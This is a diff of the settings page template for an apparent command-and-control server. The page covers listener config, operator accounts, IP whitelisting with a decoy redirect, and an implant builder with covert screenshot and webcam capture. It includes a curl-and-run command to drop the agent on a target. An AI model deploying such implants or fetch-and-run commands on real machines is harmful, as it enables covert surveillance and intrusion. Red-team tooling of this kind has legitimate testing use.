@@ -1,334 +1,433 @@
 {% extends "base.html" %}
+{% from "macros.html" import icon, status_badge %}
+
+{% block title %}Settings{% endblock %}
 
 {% block content %}
-<div class="container-fluid mt-5"> 
-    <h2 class="mb-4"><i class="fas fa-cog me-2"></i>Settings</h2>
-
-    <div class="row">
-        <div class="col-md-6">
-            <div class="card shadow-sm mb-4">
-                <div class="card-header">
-                    <h5 class="mb-0">Server Configuration</h5>
-                </div>
-                <div class="card-body">
-                    <form>
-                        <div class="mb-3">
-                            <label class="form-label">Server Host</label>
-                            <input type="text" class="form-control" value="{{ CONFIG['host'] }}" readonly>
-                        </div>
-                        <div class="mb-3">
-                            <label class="form-label">Server Port</label>
-                            <input type="number" class="form-control" value="{{ CONFIG['port'] }}" readonly>
-                        </div>
-                        <div class="mb-3">
-                            <label class="form-label">Database Path</label>
-                            <input type="text" class="form-control" value="{{ CONFIG['database'] }}" readonly>
-                        </div>
-                    </form>
-                </div>
-            </div>
-        </div>
-
-        <div class="col-md-6">
-            <div class="card shadow-sm">
-                <div class="card-header">
-                    <h5 class="mb-0">User Management</h5>
-                </div>
-                <div class="card-body">
-                    <div class="table-responsive">
-                        <table class="table" id="usersTable">
-                            <thead>
-                                <tr>
-                                    <th>Username</th>
-                                    <th>Email</th>
-                                    <th>Actions</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                <!-- User rows will be populated by JS -->
-                            </tbody>
-                        </table>
-                    </div>
-                    <hr>
-                    <h6>Add New User</h6>
-                    <form id="addUserForm">
-                        <div class="mb-3">
-                            <label for="newUsername" class="form-label">Username</label>
-                            <input type="text" class="form-control" id="newUsername" required>
-                        </div>
-                        <div class="mb-3">
-                            <label for="newEmail" class="form-label">Email</label>
-                            <input type="email" class="form-control" id="newEmail" required>
-                        </div>
-                        <div class="mb-3">
-                            <label for="newPassword" class="form-label">Password</label>
-                            <input type="password" class="form-control" id="newPassword" required>
-                        </div>
-                        <button type="submit" class="btn btn-primary">Add User</button>
-                    </form>
-                </div>
-            </div>
-        </div>
-
-
+<div class="space-y-6">
+    <!-- Page Header -->
+    <div>
+        <h1 class="text-2xl font-bold tracking-tight text-slate-100">System & Security Settings</h1>
+        <p class="text-sm text-slate-400 mt-0.5">Configure C2 listener settings, operator accounts, network IP whitelisting, and default implant parameters</p>
     </div>
 
-    <!-- IP Whitelist Section -->
-    <div class="row mt-4">
-        <div class="col-md-6">
-            <div class="card shadow-sm">
-                <div class="card-header">
-                    <h5 class="mb-0">IP Whitelist</h5>
+    <!-- Row 1: Server Configuration & User Management -->
+    <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
+        <!-- Server Configuration -->
+        <div class="lg:col-span-5 tactical-card flex flex-col">
+            <div class="tactical-card-header">
+                <div class="flex items-center gap-2.5">
+                    <span class="text-emerald-400">{{ icon('settings', 'w-5 h-5') }}</span>
+                    <h2 class="text-base font-semibold text-slate-100">C2 Listener Configuration</h2>
                 </div>
-                <div class="card-body">
-                    <div class="table-responsive">
-                        <table class="table" id="ipWhitelistTable">
-                            <thead>
-                                <tr>
-                                    <th>IP Range</th>
-                                    <th>Description</th>
-                                    <th>Status</th>
-                                    <th>Actions</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                {% for entry in whitelist %}
-                                <tr {% if not entry.enabled %}style="text-decoration: line-through; opacity: 0.6;"{% endif %}>
-                                    <td>{{ entry.ip_range }}</td>
-                                    <td>{{ entry.description }}</td>
-                                    <td>
-                                        {% if entry.enabled %}
-                                            <span class="badge bg-success">Enabled</span>
-                                        {% else %}
-                                            <span class="badge bg-secondary">Disabled</span>
-                                        {% endif %}
-                                    </td>
-                                    <td>
-                                        <button class="btn btn-sm btn-outline-primary edit-ip-btn me-2" data-id="{{ entry.id }}" data-range="{{ entry.ip_range|e }}" data-description="{{ entry.description|e }}" data-enabled="{{ entry.enabled }}" onclick="showEditIPModalFromData(this)">
-                                            <i class="fas fa-edit me-1"></i>Edit
-                                        </button>
-                        {% if not entry.description.startswith('Default allow all') %}
-                        <button class="btn btn-sm btn-outline-danger delete-ip-btn" data-id="{{ entry.id }}" data-range="{{ entry.ip_range|e }}" onclick="deleteIPFromData(this)">
-                            <i class="fas fa-trash me-1"></i>Delete
-                        </button>
-                        {% endif %}
-                                    </td>
-                                </tr>
-                                {% endfor %}
-                            </tbody>
-                        </table>
-                    </div>
-                    <hr>
-                    <div class="d-flex justify-content-between align-items-center">
-                        <button type="button" class="btn btn-primary btn-sm" id="addIPRangeBtn">
-                            <i class="fas fa-plus me-1"></i>Add IP Range
-                        </button>
+            </div>
+            <div class="p-6 space-y-4 flex-1">
+                <div>
+                    <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">Bind Host / Interface</label>
+                    <input type="text" class="tactical-input font-mono text-slate-300" value="{{ CONFIG['host'] }}" readonly>
+                </div>
+                <div>
+                    <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">Listener Port</label>
+                    <input type="number" class="tactical-input font-mono text-emerald-400" value="{{ CONFIG['port'] }}" readonly>
+                </div>
+                <div>
+                    <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">SQLite Database Path</label>
+                    <input type="text" class="tactical-input font-mono text-slate-300" value="{{ CONFIG['database'] }}" readonly>
+                </div>
+            </div>
+        </div>
+
+        <!-- User Management -->
+        <div class="lg:col-span-7 tactical-card">
+            <div class="tactical-card-header">
+                <div class="flex items-center gap-2.5">
+                    <span class="text-cyan-400">{{ icon('user', 'w-5 h-5') }}</span>
+                    <h2 class="text-base font-semibold text-slate-100">Operator Accounts</h2>
+                </div>
+            </div>
+            <div class="p-6 space-y-6">
+                <div class="overflow-x-auto rounded-xl border border-slate-800">
+                    <table class="tactical-table" id="usersTable">
+                        <thead>
+                            <tr>
+                                <th>Username</th>
+                                <th>Email</th>
+                                <th class="text-right">Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <!-- Populated via JS -->
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="pt-4 border-t border-slate-800/80">
+                    <h3 class="text-xs font-semibold uppercase tracking-wider text-slate-400 mb-3">Create New Operator</h3>
+                    <form id="addUserForm" class="grid grid-cols-1 sm:grid-cols-3 gap-3">
                         <div>
-                            <button type="button" class="btn btn-warning btn-sm me-2" id="deactivateDefaultsBtn">
-                                <i class="fas fa-ban me-1"></i>Deactivate Allow All
-                            </button>
-                            <button type="button" class="btn btn-info btn-sm" id="reactivateDefaultsBtn">
-                                <i class="fas fa-undo me-1"></i>Reactivate Allow All
+                            <input type="text" id="newUsername" class="tactical-input text-xs" placeholder="Username" required>
+                        </div>
+                        <div>
+                            <input type="email" id="newEmail" class="tactical-input text-xs" placeholder="operator@domain.local" required>
+                        </div>
+                        <div class="flex gap-2">
+                            <input type="password" id="newPassword" class="tactical-input text-xs flex-1" placeholder="Password" required>
+                            <button type="submit" class="tactical-btn-primary py-2 px-3.5 text-xs shrink-0">
+                                {{ icon('plus', 'w-4 h-4') }}
+                                <span>Add</span>
                             </button>
                         </div>
-                    </div>
-                    <hr>
-                    <h6>Blocked IP Settings</h6>
-                    <form id="blockedIPSettingsForm">
-                        <div class="mb-3">
-                            <label for="redirectUrl" class="form-label">Redirect URL for Blocked IPs</label>
-                            <input type="url" class="form-control" id="redirectUrl" placeholder="https://example.com/blocked">
-                            <small class="text-muted">Leave empty to show default blocked page</small>
-                        </div>
-                        <button type="submit" class="btn btn-primary">Save Settings</button>
                     </form>
-
                 </div>
             </div>
         </div>
+    </div>
 
-        <div class="col-md-6">
-            <div class="card shadow-sm">
-                <div class="card-header">
-                    <h5 class="mb-0">Blocked IP Logs</h5>
+    <!-- Row 2: Network Access Control (IP Whitelist & Blocked Logs) -->
+    <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
+        <!-- IP Whitelist -->
+        <div class="lg:col-span-6 tactical-card">
+            <div class="tactical-card-header flex-wrap">
+                <div class="flex items-center gap-2.5">
+                    <span class="text-emerald-400">{{ icon('shield', 'w-5 h-5') }}</span>
+                    <h2 class="text-base font-semibold text-slate-100">IP Whitelist Rules</h2>
                 </div>
-                <div class="card-body">
-                    <div class="table-responsive">
-                        <table class="table" id="blockedLogsTable">
-                            <thead>
-                                <tr>
-                                    <th>First Seen</th>
-                                    <th>Last Seen</th>
-                                    <th>IP</th>
-                                    <th>Count</th>
-                                    <th>Actions</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                {% for log in blocked_logs %}
-                                <tr>
-                                    <td>{{ log.first_seen }}</td>
-                                    <td>{{ log.last_seen }}</td>
-                                    <td>{{ log.ip }}</td>
-                                    <td>{{ log.count }}</td>
-                                    <td>
-                                        <button class="btn btn-sm btn-outline-success add-to-whitelist-btn" data-ip="{{ log.ip }}" data-log-id="{{ log.id }}">
-                                            <i class="fas fa-plus me-1"></i>Add to Whitelist
+                <div class="flex flex-wrap items-center gap-2">
+                    <button type="button" id="addIPRangeBtn" class="tactical-btn-primary py-1.5 px-3 text-xs">
+                        {{ icon('plus', 'w-3.5 h-3.5') }}
+                        <span>Add Subnet</span>
+                    </button>
+                    <button type="button" id="deactivateDefaultsBtn" class="tactical-btn-warning py-1.5 px-2.5 text-xs" title="Disable default 0.0.0.0/0 allow-all rule">
+                        <span>Disable Allow-All</span>
+                    </button>
+                    <button type="button" id="reactivateDefaultsBtn" class="tactical-btn-secondary py-1.5 px-2.5 text-xs" title="Re-enable default allow-all rule">
+                        <span>Enable Allow-All</span>
+                    </button>
+                </div>
+            </div>
+
+            <div class="p-6 space-y-6">
+                <div class="overflow-x-auto rounded-xl border border-slate-800">
+                    <table class="tactical-table" id="ipWhitelistTable">
+                        <thead>
+                            <tr>
+                                <th>CIDR / IP Range</th>
+                                <th>Description</th>
+                                <th>Status</th>
+                                <th class="text-right">Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            {% for entry in whitelist %}
+                            <tr class="{% if not entry.enabled %}opacity-50 line-through{% endif %}">
+                                <td class="font-mono text-xs text-emerald-300">{{ entry.ip_range }}</td>
+                                <td class="text-xs text-slate-300">{{ entry.description }}</td>
+                                <td>{{ status_badge('enabled' if entry.enabled else 'disabled') }}</td>
+                                <td class="text-right">
+                                    <div class="inline-flex items-center gap-1.5">
+                                        <button type="button"
+                                                class="tactical-btn-secondary py-1 px-2 text-xs edit-ip-btn"
+                                                data-id="{{ entry.id }}"
+                                                data-range="{{ entry.ip_range|e }}"
+                                                data-description="{{ entry.description|e }}"
+                                                data-enabled="{{ entry.enabled }}">
+                                            Edit
                                         </button>
-                                    </td>
-                                </tr>
-                                {% endfor %}
-                            </tbody>
-                        </table>
+                                        {% if not entry.description.startswith('Default allow all') %}
+                                        <button type="button"
+                                                class="tactical-btn-danger py-1 px-2 text-xs delete-ip-btn"
+                                                data-id="{{ entry.id }}"
+                                                data-range="{{ entry.ip_range|e }}">
+                                            Delete
+                                        </button>
+                                        {% endif %}
+                                    </div>
+                                </td>
+                            </tr>
+                            {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+
+                <form id="blockedIPSettingsForm" class="pt-4 border-t border-slate-800/80 space-y-3">
+                    <label for="redirectUrl" class="block text-xs font-semibold uppercase tracking-wider text-slate-400">Decoy Redirect URL for Unauthorized IPs</label>
+                    <div class="flex flex-col sm:flex-row gap-2.5">
+                        <input type="url" id="redirectUrl" class="tactical-input font-mono text-xs flex-1" placeholder="https://www.google.com (leave empty for HTTP 403)">
+                        <button type="submit" class="tactical-btn-primary py-2 px-4 text-xs shrink-0">Save Redirect</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- Blocked IP Logs -->
+        <div class="lg:col-span-6 tactical-card">
+            <div class="tactical-card-header">
+                <div class="flex items-center gap-2.5">
+                    <span class="text-rose-400">{{ icon('shield', 'w-5 h-5') }}</span>
+                    <h2 class="text-base font-semibold text-slate-100">Blocked Access Attempts</h2>
+                </div>
+            </div>
+            <div class="p-6">
+                <div class="overflow-x-auto rounded-xl border border-slate-800 max-h-[420px] overflow-y-auto">
+                    <table class="tactical-table" id="blockedLogsTable">
+                        <thead>
+                            <tr>
+                                <th>First Seen</th>
+                                <th>Last Seen</th>
+                                <th>Source IP</th>
+                                <th>Hits</th>
+                                <th class="text-right">Action</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            {% for log in blocked_logs %}
+                            <tr>
+                                <td class="font-mono text-xs text-slate-400">{{ log.first_seen }}</td>
+                                <td class="font-mono text-xs text-slate-400">{{ log.last_seen }}</td>
+                                <td class="font-mono text-xs text-rose-400">{{ log.ip }}</td>
+                                <td class="font-mono text-xs text-slate-300">{{ log.count }}</td>
+                                <td class="text-right">
+                                    <button type="button"
+                                            class="tactical-btn-secondary py-1 px-2.5 text-xs text-emerald-400 add-to-whitelist-btn"
+                                            data-ip="{{ log.ip }}"
+                                            data-log-id="{{ log.id }}">
+                                        + Whitelist
+                                    </button>
+                                </td>
+                            </tr>
+                            {% else %}
+                            <tr>
+                                <td colspan="5" class="text-center py-8 text-slate-500">No blocked IP attempts recorded</td>
+                            </tr>
+                            {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Row 3: Default Agent Configuration & Payload Generator -->
+    <div class="tactical-card">
+        <div class="tactical-card-header">
+            <div class="flex items-center gap-2.5">
+                <span class="text-emerald-400">{{ icon('agents', 'w-5 h-5') }}</span>
+                <h2 class="text-base font-semibold text-slate-100">Default Implant Profile & Builder</h2>
+            </div>
+        </div>
+        <div class="p-6">
+            <form id="agentConfigForm" class="space-y-5">
+                <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                    <div>
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">Check-in Interval (seconds)</label>
+                        <input type="number" class="tactical-input font-mono" id="checkinInterval" value="{{ agent_config.checkin_interval if agent_config else 10 }}" min="5" max="3600" required>
+                    </div>
+                    <div>
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">Server Callback URL</label>
+                        <input type="url" class="tactical-input font-mono" id="serverUrl"
+                               value="{{ agent_config.server_url if agent_config else (request.url_root | replace('http://', 'https://')) }}" required>
+                    </div>
+                </div>
+
+                <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 p-4 rounded-xl bg-slate-950/60 border border-slate-800/80">
+                    <div class="flex items-center gap-3">
+                        <input class="w-4 h-4 rounded bg-slate-900 border-slate-700 text-emerald-500" type="checkbox" id="takeScreenshots" {% if agent_config and agent_config.take_screenshots %}checked{% endif %}>
+                        <label class="text-sm text-slate-200" for="takeScreenshots">Automated Screenshots</label>
+                    </div>
+                    <div>
+                        <label class="block text-xs font-medium text-slate-400 mb-1">Screenshot Frequency</label>
+                        <select class="tactical-select w-full" id="screenshotFrequency">
+                            <option value="1" {% if agent_config and agent_config.screenshot_frequency == 1 %}selected{% endif %}>Every check-in</option>
+                            <option value="5" {% if agent_config and agent_config.screenshot_frequency == 5 %}selected{% endif %}>Every 5 check-ins</option>
+                            <option value="10" {% if not agent_config or agent_config.screenshot_frequency == 10 %}selected{% endif %}>Every 10 check-ins</option>
+                            <option value="30" {% if agent_config and agent_config.screenshot_frequency == 30 %}selected{% endif %}>Every 30 check-ins</option>
+                        </select>
+                    </div>
+
+                    <div class="flex items-center gap-3">
+                        <input class="w-4 h-4 rounded bg-slate-900 border-slate-700 text-emerald-500" type="checkbox" id="takeWebcam" {% if agent_config and agent_config.take_webcam %}checked{% endif %}>
+                        <label class="text-sm text-slate-200" for="takeWebcam">Automated Webcam Captures</label>
+                    </div>
+                    <div>
+                        <label class="block text-xs font-medium text-slate-400 mb-1">Webcam Capture Frequency</label>
+                        <select class="tactical-select w-full" id="webcamFrequency">
+                            <option value="1" {% if agent_config and agent_config.webcam_frequency == 1 %}selected{% endif %}>Every check-in</option>
+                            <option value="5" {% if agent_config and agent_config.webcam_frequency == 5 %}selected{% endif %}>Every 5 check-ins</option>
+                            <option value="10" {% if not agent_config or agent_config.webcam_frequency == 10 %}selected{% endif %}>Every 10 check-ins</option>
+                            <option value="30" {% if agent_config and agent_config.webcam_frequency == 30 %}selected{% endif %}>Every 30 check-ins</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                    <div>
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">Kill Date</label>
+                        <input type="datetime-local" class="tactical-input font-mono" id="killDate" value="{{ agent_config.killdate|replace(' ', 'T') if agent_config and agent_config.killdate else '' }}">
+                    </div>
+                    <div class="flex flex-col justify-center gap-2.5 pt-2">
+                        <label class="inline-flex items-center gap-2.5 cursor-pointer">
+                            <input class="w-4 h-4 rounded bg-slate-900 border-slate-700 text-emerald-500" type="checkbox" id="enableKillDate" {% if agent_config and agent_config.killdate_enabled %}checked{% endif %}>
+                            <span class="text-sm text-slate-200">Enable Kill Date</span>
+                        </label>
+                        <label class="inline-flex items-center gap-2.5 cursor-pointer">
+                            <input class="w-4 h-4 rounded bg-slate-900 border-slate-700 text-emerald-500" type="checkbox" id="trustedCertificate" {% if agent_config and agent_config.trusted_certificate %}checked{% endif %}>
+                            <span class="text-sm text-slate-200">Trusted TLS Certificate</span>
+                        </label>
+                    </div>
+                </div>
+
+                <div>
+                    <button type="submit" class="tactical-btn-primary">
+                        {{ icon('tools', 'w-4 h-4') }}
+                        <span>Save Profile & Generate Agent</span>
+                    </button>
+                </div>
+            </form>
+
+            <div id="agentDownload" class="mt-6 pt-6 border-t border-slate-800 space-y-4" style="display: none;">
+                <div class="flex items-center justify-between">
+                    <span class="text-sm font-semibold text-emerald-400">Agent Payload Compiled</span>
+                    <a id="downloadLink" href="#" class="tactical-btn-primary">
+                        {{ icon('download', 'w-4 h-4') }}
+                        <span>Download Agent</span>
+                    </a>
+                </div>
+                <div id="displayArea" class="p-4 rounded-xl bg-slate-950 border border-slate-800 font-mono text-xs space-y-2">
+                    <div class="flex items-center justify-between gap-2">
+                        <code id="command1" class="text-cyan-300">curl -ks {{ request.url_root }}a/d -o agent.py</code>
+                        <button type="button" class="tactical-btn-ghost copy-btn" data-target="command1">Copy</button>
+                    </div>
+                    <div class="flex items-center justify-between gap-2">
+                        <code id="command2" class="text-emerald-300">python3 agent.py</code>
+                        <button type="button" class="tactical-btn-ghost copy-btn" data-target="command2">Copy</button>
                     </div>
                 </div>
             </div>
+
+            <div id="agentError" class="mt-4 px-4 py-3 rounded-xl bg-rose-500/10 border border-rose-500/30 text-rose-300 text-sm" style="display: none;"></div>
         </div>
     </div>
+</div>
 
-    <!-- Agent Configuration Section -->
-    <div class="row mt-4">
-        <div class="col-md-12">
-            <div class="card shadow-sm">
-                <div class="card-header">
-                    <h5 class="mb-0">Agent Configuration</h5>
+<!-- Add IP Range Modal -->
+<div class="glycon-modal modal fixed inset-0 z-50 hidden items-center justify-center p-4 bg-slate-950/80 backdrop-blur-sm" id="addIPModal" tabindex="-1" aria-hidden="true">
+    <div class="bg-slate-900 border border-slate-800 rounded-2xl shadow-2xl max-w-md w-full overflow-hidden">
+        <div class="px-6 py-4 border-b border-slate-800 flex items-center justify-between bg-slate-950/50">
+            <h3 class="text-base font-semibold text-slate-100" id="addIPModalLabel">Add IP / CIDR Range</h3>
+            <button type="button" data-modal-close class="text-slate-400 hover:text-slate-100 p-1.5 rounded-lg hover:bg-slate-800">
+                {{ icon('close', 'w-5 h-5') }}
+            </button>
+        </div>
+        <form id="addIPForm">
+            <div class="p-6 space-y-4">
+                <div>
+                    <label for="newIPRange" class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">IP or CIDR Subnet</label>
+                    <input type="text" class="tactical-input font-mono" id="newIPRange" placeholder="192.168.1.0/24" required>
                 </div>
-                <div class="card-body">
-                    <form id="agentConfigForm">
-                        <div class="row mb-3">
-                            <div class="col-md-6">
-                                <label class="form-label">Check-in Interval (seconds)</label>
-                                <input type="number" class="form-control" id="checkinInterval" value="{{ agent_config.checkin_interval if agent_config else 10 }}" min="5" max="3600" required>
-                            </div>
-                            <div class="col-md-6">
-                                <label class="form-label">Server URL</label>
-                                <input type="url" class="form-control" id="serverUrl" 
-                                       value="{{ agent_config.server_url if agent_config else (request.url_root | replace('http://', 'https://')) }}" required>
-                            </div>
-                        </div>
-                        <div class="row mb-3">
-                            <div class="col-md-6">
-                                <div class="form-check">
-                                    <input class="form-check-input" type="checkbox" id="takeScreenshots" {% if agent_config and agent_config.take_screenshots %}checked{% endif %}>
-                                    <label class="form-check-label" for="takeScreenshots">Take Screenshots</label>
-                                </div>
-                            </div>
-                            <div class="col-md-6">
-                                <label class="form-label">Screenshot Frequency</label>
-                                    <select class="form-select" id="screenshotFrequency">
-                                    <option value="1" {% if agent_config and agent_config.screenshot_frequency == 1 %}selected{% endif %}>Every check-in</option>
-                                    <option value="5" {% if agent_config and agent_config.screenshot_frequency == 5 %}selected{% endif %}>Every 5 check-ins</option>
-                                    <option value="10" {% if not agent_config or agent_config.screenshot_frequency == 10 %}selected{% endif %}>Every 10 check-ins</option>
-                                    <option value="30" {% if agent_config and agent_config.screenshot_frequency == 30 %}selected{% endif %}>Every 30 check-ins</option>
-                                </select>
-                            </div>
-                        </div>
-                        <div class="row mb-3">
-                            <div class="col-md-6">
-                                <div class="form-check">
-                                    <input class="form-check-input" type="checkbox" id="takeWebcam" {% if agent_config and agent_config.take_webcam %}checked{% endif %}>
-                                    <label class="form-check-label" for="takeWebcam">Take Webcam Captures</label>
-                                </div>
-                            </div>
-                            <div class="col-md-6">
-                                <label class="form-label">Webcam Capture Frequency</label>
-                                    <select class="form-select" id="webcamFrequency">
-                                    <option value="1" {% if agent_config and agent_config.webcam_frequency == 1 %}selected{% endif %}>Every check-in</option>
-                                    <option value="5" {% if agent_config and agent_config.webcam_frequency == 5 %}selected{% endif %}>Every 5 check-ins</option>
-                                    <option value="10" {% if not agent_config or agent_config.webcam_frequency == 10 %}selected{% endif %}>Every 10 check-ins</option>
-                                    <option value="30" {% if agent_config and agent_config.webcam_frequency == 30 %}selected{% endif %}>Every 30 check-ins</option>
-                                </select>
-                            </div>
-                        </div>
-                        <div class="row mb-3">
-                            <div class="col-md-6">
-                                <label class="form-label">Kill Date</label>
-                                <input type="datetime-local" class="form-control" id="killDate" value="{{ agent_config.killdate|replace(' ', 'T') if agent_config and agent_config.killdate else '' }}">
-                                <small class="text-muted">Agent will self-destruct after this date/time</small>
-                            </div>
-                            <div class="col-md-6">
-                                <div class="form-check mt-4 pt-3">
-                                    <input class="form-check-input" type="checkbox" id="enableKillDate" {% if agent_config and agent_config.killdate_enabled %}checked{% endif %}>
-                                    <label class="form-check-label" for="enableKillDate">Enable Kill Date</label>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="row mb-3">
-                            <div class="col-md-6">
-                                <div class="form-check">
-                                    <input class="form-check-input" type="checkbox" id="trustedCertificate" {% if agent_config and agent_config.trusted_certificate %}checked{% endif %}>
-                                    <label class="form-check-label" for="trustedCertificate">Trusted Certificate</label>
-                                </div>
-                            </div>
-                        </div>
-                        <button type="submit" class="btn btn-primary">Generate Agent</button>
-                    </form>
-                    <div id="agentDownload" class="mt-3" style="display: none;">
-                        <a id="downloadLink" href="#" class="btn btn-success">
-                            <i class="fas fa-download me-2"></i>Download Agent
-                        </a><div><br>
-                            <b>Or copy and run on target:</b><br>
-                            <div id="displayArea" class="command-display mt-3" style="
-                            background-color: #1e1e1e;
-                            border-radius: 5px;
-                            padding: 15px;
-                            position: relative;
-                            font-family: 'Consolas', 'Monaco', monospace;
-                            color: #d4d4d4;
-                            border-left: 4px solid #569cd6;
-                            overflow-x: auto;
-                            white-space: nowrap;
-                        ">
-                            <div class="command-line mb-2">
-                                <code id="command1">curl -s {{ base_url }}/a/d -o agent.py</code>
-                                <button class="btn btn-sm btn-outline-secondary copy-btn ms-2" data-target="command1">
-                                    <i class="fas fa-copy"></i> Copy
-                                </button>
-                            </div>
-                            <div class="command-line">
-                                <code id="command2">python3 agent.py</code>
-                                <button class="btn btn-sm btn-outline-secondary copy-btn ms-2" data-target="command2">
-                                    <i class="fas fa-copy"></i> Copy
-                                </button>
-                            </div>
-                        </div>
-                    </div>
-
-
-                    <div id="agentError" class="alert alert-danger mt-3" style="display: none;"></div>
+                <div>
+                    <label for="newIPDescription" class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">Description</label>
+                    <input type="text" class="tactical-input" id="newIPDescription" placeholder="Operator VPN Subnet">
                 </div>
             </div>
-        </div>
+            <div class="px-6 py-3.5 bg-slate-950/60 border-t border-slate-800 flex justify-end gap-2.5">
+                <button type="button" data-modal-close class="tactical-btn-secondary">Cancel</button>
+                <button type="submit" class="tactical-btn-primary">Add to Whitelist</button>
+            </div>
+        </form>
     </div>
+</div>
 
-    <!-- Add IP Range Modal -->
-    <div class="modal fade" id="addIPModal" tabindex="-1" aria-labelledby="addIPModalLabel" aria-hidden="true">
-        <div class="modal-dialog">
-            <div class="modal-content">
-                <div class="modal-header">
-                    <h5 class="modal-title" id="addIPModalLabel">Add New IP Range</h5>
-                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+<!-- Edit IP Range Modal -->
+<div class="glycon-modal modal fixed inset-0 z-50 hidden items-center justify-center p-4 bg-slate-950/80 backdrop-blur-sm" id="editIPModal" tabindex="-1" aria-hidden="true">
+    <div class="bg-slate-900 border border-slate-800 rounded-2xl shadow-2xl max-w-md w-full overflow-hidden">
+        <div class="px-6 py-4 border-b border-slate-800 flex items-center justify-between bg-slate-950/50">
+            <h3 class="text-base font-semibold text-slate-100">Edit Whitelist Rule</h3>
+            <button type="button" data-modal-close class="text-slate-400 hover:text-slate-100 p-1.5 rounded-lg hover:bg-slate-800">
+                {{ icon('close', 'w-5 h-5') }}
+            </button>
+        </div>
+        <form id="editIPForm">
+            <input type="hidden" id="editIPIdInput">
+            <div class="p-6 space-y-4">
+                <div>
+                    <label for="editIPRangeInput" class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">IP Range</label>
+                    <input type="text" class="tactical-input font-mono" id="editIPRangeInput" required>
                 </div>
-                <div class="modal-body">
-                    <form id="addIPForm">
-                        <div class="mb-3">
-                            <label for="newIPRange" class="form-label">IP Range (e.g., 192.168.1.0/24, 10.0.0.1)</label>
-                            <input type="text" class="form-control" id="newIPRange" placeholder="192.168.1.0/24" required>
-                        </div>
-                        <div class="mb-3">
-                            <label for="newIPDescription" class="form-label">Description</label>
-                            <input type="text" class="form-control" id="newIPDescription" placeholder="Local network">
-                        </div>
-                        <button type="submit" class="btn btn-primary">Add to Whitelist</button>
-                    </form>
+                <div>
+                    <label for="editIPDescriptionInput" class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">Description</label>
+                    <input type="text" class="tactical-input" id="editIPDescriptionInput">
+                </div>
+                <label class="inline-flex items-center gap-2.5 cursor-pointer">
+                    <input type="checkbox" class="w-4 h-4 rounded bg-slate-900 border-slate-700 text-emerald-500" id="editIPEnabledInput">
+                    <span class="text-sm text-slate-200">Rule Enabled</span>
+                </label>
+            </div>
+            <div class="px-6 py-3.5 bg-slate-950/60 border-t border-slate-800 flex justify-end gap-2.5">
+                <button type="button" data-modal-close class="tactical-btn-secondary">Cancel</button>
+                <button type="submit" class="tactical-btn-primary">Save Changes</button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<!-- Edit User Modal -->
+<div class="glycon-modal modal fixed inset-0 z-50 hidden items-center justify-center p-4 bg-slate-950/80 backdrop-blur-sm" id="editUserModal" tabindex="-1" aria-hidden="true">
+    <div class="bg-slate-900 border border-slate-800 rounded-2xl shadow-2xl max-w-md w-full overflow-hidden">
+        <div class="px-6 py-4 border-b border-slate-800 flex items-center justify-between bg-slate-950/50">
+            <h3 class="text-base font-semibold text-slate-100" id="editUserModalLabel">Edit Operator Account</h3>
+            <button type="button" data-modal-close class="text-slate-400 hover:text-slate-100 p-1.5 rounded-lg hover:bg-slate-800">
+                {{ icon('close', 'w-5 h-5') }}
+            </button>
+        </div>
+        <form id="editUserForm">
+            <input type="hidden" id="editUserIdInput">
+            <div class="p-6 space-y-4">
+                <div>
+                    <label for="editUsernameInput" class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">Username</label>
+                    <input type="text" class="tactical-input" id="editUsernameInput" required>
+                </div>
+                <div>
+                    <label for="editEmailInput" class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">Email</label>
+                    <input type="email" class="tactical-input" id="editEmailInput" required>
                 </div>
             </div>
-        </div>
+            <div class="px-6 py-3.5 bg-slate-950/60 border-t border-slate-800 flex justify-end gap-2.5">
+                <button type="button" data-modal-close class="tactical-btn-secondary">Cancel</button>
+                <button type="submit" class="tactical-btn-primary">Save Changes</button>
+            </div>
+        </form>
     </div>
+</div>
 
+<!-- Change Password Modal -->
+<div class="glycon-modal modal fixed inset-0 z-50 hidden items-center justify-center p-4 bg-slate-950/80 backdrop-blur-sm" id="changePasswordModal" tabindex="-1" aria-hidden="true">
+    <div class="bg-slate-900 border border-slate-800 rounded-2xl shadow-2xl max-w-md w-full overflow-hidden">
+        <div class="px-6 py-4 border-b border-slate-800 flex items-center justify-between bg-slate-950/50">
+            <h3 class="text-base font-semibold text-slate-100" id="changePasswordModalLabel">Change Operator Password</h3>
+            <button type="button" data-modal-close class="text-slate-400 hover:text-slate-100 p-1.5 rounded-lg hover:bg-slate-800">
+                {{ icon('close', 'w-5 h-5') }}
+            </button>
+        </div>
+        <form id="changePasswordForm">
+            <input type="hidden" id="changePasswordUserIdInput">
+            <div class="p-6 space-y-4">
+                <div>
